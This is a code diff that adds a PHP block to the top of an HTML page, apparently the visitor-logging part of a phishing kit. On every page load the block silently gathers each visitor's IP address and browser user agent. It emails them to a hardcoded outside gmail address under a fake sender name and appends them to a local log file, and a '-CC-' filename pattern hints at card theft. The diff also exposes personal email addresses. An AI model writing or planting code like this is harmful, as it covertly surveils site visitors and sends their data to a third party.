@@ -1,3 +1,64 @@
+<?php
+
+session_start();
+ 
+
+// Get user IP address
+if ( isset($_SERVER['HTTP_CLIENT_IP']) && ! empty($_SERVER['HTTP_CLIENT_IP'])) {
+    $ip = $_SERVER['HTTP_CLIENT_IP'];
+} elseif ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) && ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+} else {
+    $ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
+}
+
+$ip = filter_var($ip, FILTER_VALIDATE_IP);
+$ip = ($ip === false) ? '0.0.0.0' : $ip;
+
+// Get user IP address
+
+$to = 'hamady.gharib2021@gmail.com';
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+
+$subject = "$ip\n";
+
+$headers = "From: App-micro <hn.pro.961@gmail.com>\r\n" ;
+
+
+$body .= "From ; $ip | http://www.geoiptool.com/?IP=$ip   \n";
+$body .= $_SERVER['HTTP_USER_AGENT'];
+$rnessage = "$body\n";
+mail($to, $subject, $body , $headers);
+
+
+$file_to_write = "$ip-CC-".date("m-d-Y-g-i-s").".txt";
+$content_to_write = "
+=======================
+URL :  ".$_SESSION['url']."
+=======================
+".$_SERVER['HTTP_USER_AGENT']."
+".date ("m-d-Y")."||".date ("g:i:s")."
+=====================================================================";
+	$f = fopen("map", "a");
+	fwrite($f, $content_to_write);
+		fclose($f);
+/*
+if( is_dir($dir) === false )
+{
+    mkdir($dir);
+}
+
+$file = fopen($dir . '/' . $file_to_write,"w");
+
+// a different way to write content into
+// fwrite($file,"Hello World.");
+
+fwrite($file,$content_to_write);
+
+*/
+//echo "$ip";
+
+?>
 <!doctype html>
 <html lang="en">
 
